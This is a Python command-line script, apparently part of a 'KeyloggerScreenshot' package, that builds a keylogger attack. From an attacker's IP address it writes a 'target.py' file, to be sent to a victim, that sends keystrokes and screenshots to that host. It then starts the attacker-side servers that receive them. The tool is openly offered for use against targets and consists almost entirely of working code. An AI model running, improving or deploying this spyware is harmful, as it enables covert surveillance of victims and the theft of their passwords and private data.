import KeyloggerScreenshot as ks
import sys
import threading
import random

gui = """
    __ __              __                                 _____                                       __            __ 
   / //_/___   __  __ / /____   ____ _ ____ _ ___   _____/ ___/ _____ _____ ___   ___   ____   _____ / /_   ____   / /_
  / ,<  / _ \ / / / // // __ \ / __ `// __ `// _ \ / ___/\__ \ / ___// ___// _ \ / _ \ / __ \ / ___// __ \ / __ \ / __/
 / /| |/  __// /_/ // // /_/ // /_/ // /_/ //  __// /   ___/ // /__ / /   /  __//  __// / / /(__  )/ / / // /_/ // /_  
/_/ |_|\___/ \__, //_/ \____/ \__, / \__, / \___//_/   /____/ \___//_/    \___/ \___//_/ /_//____//_/ /_/ \____/ \__/  
            /____/           /____/ /____/                                                                             
                        ~Created by: Fawaz Bashiru~                             
"""
print(gui)
lst = sys.argv

try:
    if "-aip" in lst:
        idx = lst.index("-aip")
        try:
            ipaddress = lst[idx+1]
            zahlen = "123456789"
            nummer = 0
            port_numbers = []
            while nummer != 4:
                nummer += 1
                random_lst = "".join(random.sample(zahlen, 4))
                port_numbers.append(random_lst)

            port_photos = int(port_numbers[0])
            port_keylogger = int(port_numbers[1])
            port_listener = int(port_numbers[2])
            port_time = int(port_numbers[3])

            if "-s" in lst:
                idx_s = lst.index("-s")
                try:
                    seconds = int(lst[idx_s + 1])
                    if seconds < 60:
                        print(f"SECONDS MUST BE GREATER THAN 60")

                except IndexError:
                    seconds = 60
            else: seconds = 60

            if "-cf" in lst:
                idx_cf = lst.index("-cf")
                try:
                    neu_idx_cf = lst[idx_cf + 1]
                    with open(f"{neu_idx_cf}", "a+") as file:
                        file.write(f"import KeyloggerScreenshot as ks \n\nip = '{ipaddress}'\nkey_client = ks.KeyloggerTarget(ip, {port_photos}, ip, {port_keylogger}, ip, {port_listener},ip, {port_time}, duration_in_seconds={seconds}) \nkey_client.start()")
                    print(f"{neu_idx_cf.upper()} has been created")

                except IndexError:
                    with open("target.py", "a+") as file:
                        file.write(f"import KeyloggerScreenshot as ks \n\nip = '{ipaddress}'\nkey_client = ks.KeyloggerTarget(ip, {port_photos}, ip, {port_keylogger}, ip, {port_listener},ip, {port_time}, duration_in_seconds={seconds}) \nkey_client.start()")
                    print("TARGET.PY HAS BEEN CREATED YOU CAN SEND THIS TO YOUR TARGET")
            else: seconds = 60
            server_photos = ks.ServerPhotos(ipaddress, port_photos)

            server_keylogger = ks.ServerKeylogger(ipaddress, port_keylogger)

            server_listener = ks.ServerListener(ipaddress, port_listener)

            server_time = ks.Timer(ipaddress, port_time)

            threading_server = threading.Thread(target=server_photos.start)
            threading_server.start()

            threading_server2 = threading.Thread(target=server_keylogger.start)
            threading_server2.start()

            threading_server3 = threading.Thread(target=server_listener.start)
            threading_server3.start()

            threading_server4 = threading.Thread(target=server_time.start_timer)
            threading_server4.start()

        except IndexError:
            print("YOU FORGET TO INSERT YOUR IP")

    elif "-aip" in lst and "-help" not in lst:
        print("PLEASE INSERT YOUR IP WITH -aip")

    if "-help" in lst:
        print("-aip INSERT THE SERVERS IP\n-s SPECIFY YOUR SECONDS (DEFAULT 60 SECONDS)\n-cf CREATES TARGET FILE WHICH YOU SEND TO ANY TARGET")

except OSError:
    print("CHECK YOUR IP-ADDRESS")